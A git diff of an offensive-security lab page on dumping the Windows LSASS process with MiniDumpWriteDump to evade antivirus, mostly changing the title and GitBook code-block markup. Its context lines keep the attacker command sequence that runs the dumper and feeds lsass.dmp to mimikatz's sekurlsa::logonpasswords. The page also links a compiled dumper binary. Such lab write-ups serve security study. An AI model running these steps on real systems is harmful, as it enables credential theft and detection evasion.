@@ -2,7 +2,7 @@
 description: 'Evasion, Credential Dumping'
 ---
 
-# Dumping LSASS without Mimikatz == Reduced Chances of Getting Flagged by AVs
+# Dumping LSASS without Mimikatz with MiniDumpWriteDump == Reduced Chances of Getting Flagged by AVs
 
 This lab explores how one could write a simple `lsass` process dumper for extracting the passwords it contains later on with mimikatz. **Possibly** without getting detected by some AV vendors - if you have a way of testing this against some known EDR solutions, I would be interested to hear about your findings.
 
@@ -14,8 +14,7 @@ The below code uses a number of known Windows API calls that could still be flag
 
 Let's go ahead and compile this C++ code:
 
-{% code-tabs %}
-{% code-tabs-item title="dumper.cpp" %}
+{% code title="dumper.cpp" %}
 ```cpp
 #include "stdafx.h"
 #include <windows.h>
@@ -52,8 +51,7 @@ int main() {
     return 0;
 }
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endcode %}
 
 {% file src="../../.gitbook/assets/createminidump.exe" caption="CreateMiniDump.exe" %}
 
@@ -69,16 +67,14 @@ Do not forget to add `dbghelp.lib` as a dependency in the Linker &gt; Input sett
 4. Open mimikatz and load in the dump file 
 5. Dump passwords
 
-{% code-tabs %}
-{% code-tabs-item title="attacker" %}
+{% code title="attacker" %}
 ```csharp
 .\createminidump.exe
 .\mimikatz.exe
 sekurlsa::minidump c:\temp\lsass.dmp
 sekurlsa::logonpasswords
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/peek-2019-03-23-22-16.gif)
 
